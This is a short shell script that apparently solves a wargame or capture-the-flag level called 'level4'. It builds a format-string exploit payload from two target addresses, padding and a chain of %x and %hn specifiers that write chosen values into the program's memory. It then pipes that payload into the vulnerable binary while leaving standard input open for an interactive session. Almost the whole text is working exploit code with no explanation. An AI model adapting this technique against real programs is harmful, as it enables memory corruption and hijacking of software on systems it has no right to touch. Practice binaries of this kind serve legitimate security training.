#!/bin/sh

# REQUIREMENTS:
# Python must be installed
# Must be on a x86, 32bit Linux architecture.

ADDRESS_LOW_ORDER_BYTES="\x10\x98\x04\x08"
ADDRESS_HIGH_ORDER_BYTES="\x12\x98\x04\x08"

echo $(python -c "print('$ADDRESS_HIGH_ORDER_BYTES' + 'AAAA' + '$ADDRESS_LOW_ORDER_BYTES' + '%x' * 10 + '%186x' + '%hn' + '%21570x' + '%hn')") > /tmp/payload

cat /tmp/payload - | /home/user/level4/level4
rm /tmp/payload